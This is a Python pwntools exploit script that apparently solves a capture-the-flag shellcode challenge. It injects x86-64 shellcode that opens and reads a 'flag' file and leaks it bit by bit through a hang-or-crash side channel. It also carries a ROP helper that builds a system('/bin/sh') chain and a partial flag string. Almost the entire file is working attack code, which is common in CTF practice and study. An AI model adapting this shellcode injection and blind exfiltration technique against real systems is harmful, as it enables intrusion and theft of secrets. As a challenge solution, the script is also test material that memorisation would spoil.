#!/usr/bin/python3
from pwn import *


sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()


elf = context.binary = ELF('pro', checksec=False)
libc = ELF('pro', checksec=False)
base = None
def int_from_bytes(bytes):
    return int.from_bytes(bytes, byteorder='little')
def get_exe_base(pid):
    maps_file = f"/proc/{pid}/maps"
    exe_base = None

    with open(maps_file, 'r') as f:
        exe_base = int(f.readline().split('-')[0], 16)

    if exe_base is None:
        raise Exception("Executable base address not found.")
    
    return exe_base
def rop_binsh(no_ret=1):
    rop = ROP(libc)
    ret = rop.find_gadget(['ret']) #rop.raw(rop.find_gadget(["pop rbp", "ret"]))
    for i in range(no_ret):
        rop.raw(ret)
    rop.system(next(libc.search(b'/bin/sh\x00')))
    return rop.chain()
def GDB(proc):
    if not args.REMOTE:
        gdb.attach(p, gdbscript=f'''
                   b *({base + 0x181C})
                    c
                    si
                    ''')

flag = 'W1{N0_5td1'#Ã¿_N0_5td0ut_N0_5td3rr_b^t_h0w_c4n_u_st34l_MY_h34rt_'
# flag += 'd13ae' #ba3d9160d569ae7e1986cc5b151' 
# flag = 'W1{N0_5td1'
while True:
    cur = 0
    for i in range(7):
        print(hex(cur))
        print(flag)
        if args.REMOTE:
            p = remote(sys.argv[1], sys.argv[2])
        else:
            p = process(stdin=PTY)
            base = get_exe_base(p.pid)
            # GDB(p)
        shellcode = '''
        mov    rsp,QWORD PTR fs:0x0
        '''
        shellcode += shellcraft.openat(0xffffff9c, 'flag', 0)
        shellcode += f'''
        mov    rsi,QWORD PTR fs:0x0
        sub rsi, 0x300
        mov rdi, rax
        mov rdx, 0x100
        mov r10, 0
        mov rax, 17
        syscall
        add rsi, {len(flag)}
        xor rax, rax
        mov    al,BYTE PTR [rsi]
        shr rax, {i}
        and rax, 1
        test rax, rax
        jz loop
        xor rsp, rsp
        push rax
        loop:
            jmp loop
        '''
        payload = asm(shellcode)
        # pause()
        sla(b'Shellcode: ', payload)
        # p.interactive()
        p.wait(0.5)
        try:
            p.recv(10, 0.1)
            # flag += chr(i)
            
            p.close()
            continue
        except:
            cur |= (1 << i)
            # print('hehe')
            # flag += chr(i)
            p.close()
            continue
    print(hex(cur))
    print(chr(cur))
    flag += chr(cur)
    # pause()